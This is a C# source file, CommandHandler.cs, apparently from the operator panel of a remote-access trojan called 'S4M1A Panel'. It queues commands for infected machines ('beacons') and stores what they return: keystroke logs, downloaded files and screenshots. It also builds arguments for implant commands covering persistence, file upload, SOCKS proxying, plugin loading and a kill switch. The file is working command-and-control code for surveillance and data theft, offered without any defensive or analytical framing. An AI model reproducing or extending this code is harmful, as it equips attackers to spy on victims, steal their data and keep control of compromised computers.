using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace S4M1A.Panel
{
    // =====================================================================
    //  S4M1A Panel v2.0 - CommandHandler.cs
    //  Operator-facing command bus:
    //    - task queue per session (FIFO, consumed by C2Server.Beacon)
    //    - result ingestion (beacon "res" field)
    //    - keystroke ingestion (beacon "klog" field, base64 -> data\klogs\<sid>.log)
    //    - composite argument builders that match Commands.cs contracts
    // =====================================================================

    public static class CommandHandler
    {
        private static PanelConfig _cfg;
        private static string _klogDir = "data/klogs";

        // PendingOp links a delivered task (cid) back to the command name +
        // args, so binary results (download / screenshot, base64 in "res")
        // can be persisted to disk at the bus level for console operators.
        private sealed class PendingOp
        {
            public string Sid;
            public string Cmd;
            public string Args;
            public DateTime When;
        }

        private static readonly Dictionary<string, PendingOp> _pending =
            new Dictionary<string, PendingOp>();
        private static readonly object _pendLock = new object();

        public static void Init(PanelConfig cfg)
        {
            _cfg = cfg;
            _klogDir = Path.Combine(cfg.DataDir, "klogs");
            try { Directory.CreateDirectory(_klogDir); } catch { }
        }

        // =====================================================================
        //  Enqueue
        // =====================================================================

        public static string Enqueue(string sid, string cmd, string args = "")
        {
            Session s = SessionStore.GetOrCreate(sid);
            CmdTask t = new CmdTask
            {
                Cid = Guid.NewGuid().ToString("N").Substring(0, 16),
                Cmd = cmd,
                Args = args ?? "",
                CreatedUtc = DateTime.UtcNow
            };
            lock (s)
            {
                if (s.Queue == null) s.Queue = new List<CmdTask>();
                s.Queue.Add(t);
            }
            SessionStore.Save();
            return t.Cid;
        }

        public static string EnqueueKill(string sid)
        {
            string k = (_cfg != null && !string.IsNullOrEmpty(_cfg.KillPassword))
                ? _cfg.KillPassword : "";
            return Enqueue(sid, "killsw", k);
        }

        // Pops the oldest pending task for a beacon (null when empty).
        public static CmdTask NextFor(string sid)
        {
            Session s = SessionStore.Find(sid);
            if (s == null) return null;
            CmdTask t;
            lock (s) { t = s.NextTask(); }
            if (t != null)
            {
                TrackPending(sid, t);
                SessionStore.Save();
            }
            return t;
        }

        // =====================================================================
        //  Ingest
        // =====================================================================

        // res = the parsed JSON object from beacon "res"
        // ("ok" bool, "data"/"err" strings, "act" string)
        public static void SubmitResult(string sid, string cid, Dictionary<string, object> res)
        {
            Session s = SessionStore.GetOrCreate(sid);
            CmdResult r = new CmdResult
            {
                Cid = cid,
                Ok = res != null &&
                     res.ContainsKey("ok") &&
                     (res["ok"] as bool? ?? false),
                Data = res != null && res.ContainsKey("data")
                    ? Convert.ToString(res["data"]) : "",
                Err = res != null && res.ContainsKey("err")
                    ? Convert.ToString(res["err"]) : "",
                Act = res != null && res.ContainsKey("act")
                    ? Convert.ToString(res["act"]) : "",
                ReceivedUtc = DateTime.UtcNow
            };
            lock (s)
            {
                if (s.Results == null) s.Results = new List<CmdResult>();
                s.Results.Add(r);
                if (s.Results.Count > 2000)
                    s.Results.RemoveRange(0, s.Results.Count - 2000);
            }
            SessionStore.Save();
            SaveBlobResult(sid, cid, r);
        }

        // ---------------------------------------------------------------------
        //  Binary artifact persistence (download / screenshot)
        // ---------------------------------------------------------------------

        private static void TrackPending(string sid, CmdTask t)
        {
            lock (_pendLock)
            {
                PrunePendingLocked();
                _pending[t.Cid] = new PendingOp
                {
                    Sid = sid, Cmd = t.Cmd, Args = t.Args,
                    When = DateTime.UtcNow
                };
            }
        }

        // Keeps the map bounded: once over 1024 entries, drop the oldest half.
        private static void PrunePendingLocked()
        {
            if (_pending.Count < 1024) return;
            var order = _pending.OrderBy(kv => kv.Value.When).Take(512).ToList();
            foreach (KeyValuePair<string, PendingOp> kv in order)
                _pending.Remove(kv.Key);
        }

        // download/screenshot results arrive as base64 in beacon "res".
        // Persist them to data\downloads\<sid>\ (same layout as the GUI).
        private static void SaveBlobResult(string sid, string cid, CmdResult r)
        {
            PendingOp op;
            lock (_pendLock)
            {
                if (!_pending.TryGetValue(cid, out op)) return;
                _pending.Remove(cid);
            }
            if (op == null || _cfg == null) return;
            if (!r.Ok || (op.Cmd != "download" && op.Cmd != "screenshot")) return;

            string data = (r.Data ?? "").Trim();
            if (data.Length == 0 || data.StartsWith("ERR:")) return;

            byte[] bytes;
            try { bytes = Convert.FromBase64String(data); }
            catch { return; }
            if (bytes.Length == 0) return;

            string name;
            if (op.Cmd == "screenshot")
            {
                name = "screenshot_" + cid + ".png";
            }
            else
            {
                name = (op.Args ?? "").Trim().TrimEnd('\\', '/');
                name = Path.GetFileName(name);
                if (string.IsNullOrEmpty(name)) name = "file_" + cid;
            }

            try
            {
                string dir = Path.Combine(_cfg.DataDir, "downloads", op.Sid);
                Directory.CreateDirectory(dir);
                File.WriteAllBytes(Path.Combine(dir, name), bytes);
            }
            catch { }
        }

        // klog arrives as base64(UTF-8 log text); append decoded text to disk.
        public static void AppendKlog(string sid, string b64Text)
        {
            try
            {
                byte[] raw = Convert.FromBase64String(b64Text ?? "");
                string text = Encoding.UTF8.GetString(raw);
                string file = Path.Combine(_klogDir, sid + ".log");
                File.AppendAllText(file, text, Encoding.UTF8);
                Session s = SessionStore.Find(sid);
                if (s != null) s.KlogBytes += raw.Length;
            }
            catch { }
        }

        public static string GetKlog(string sid)
        {
            try
            {
                string file = Path.Combine(_klogDir, sid + ".log");
                return File.Exists(file) ? File.ReadAllText(file, Encoding.UTF8) : "";
            }
            catch { return ""; }
        }

        public static int PendingCount(string sid)
        {
            Session s = SessionStore.Find(sid);
            if (s == null || s.Queue == null) return 0;
            lock (s) { return s.Queue.Count; }
        }

        public static string GetCid(string sid)
        {
            Session s = SessionStore.Find(sid);
            return s != null ? s.Sid : sid;
        }

        // =====================================================================
        //  Queries
        // =====================================================================

        public static List<Session> Sessions()
        {
            return SessionStore.All();
        }

        public static Session GetSession(string sid)
        {
            return SessionStore.Find(sid);
        }

        public static void PurgeDead(double maxHours)
        {
            SessionStore.RemoveDead(maxHours);
        }

        public static Tuple<int, int> AliveDead(double maxHours)
        {
            List<Session> all = SessionStore.All();
            int alive = all.Count(s => s.IsAlive(maxHours));
            return Tuple.Create(alive, all.Count - alive);
        }

        // =====================================================================
        //  Composite argument builders (match Implant Commands.cs contracts)
        // =====================================================================

        public static string PersistArgs(string action, string name,
                                         string type, string payload)
        {
            // action: add | remove
            if (action == "remove")
                return "remove|" + name;
            return "add|" + name + "|" + type + "|" + payload;
        }

        public static string UploadArgs(string targetPath, string base64File)
        {
            return targetPath + "|" + base64File;
        }

        public static string SleepArgs(int milliseconds)
        {
            return milliseconds.ToString();
        }

        public static string SocksArgs(string action, int port)
        {
            return action == "stop" ? "stop" : "start|" + port;
        }

        public static string PluginArgs(string base64Blob)
        {
            return base64Blob;
        }
    }
}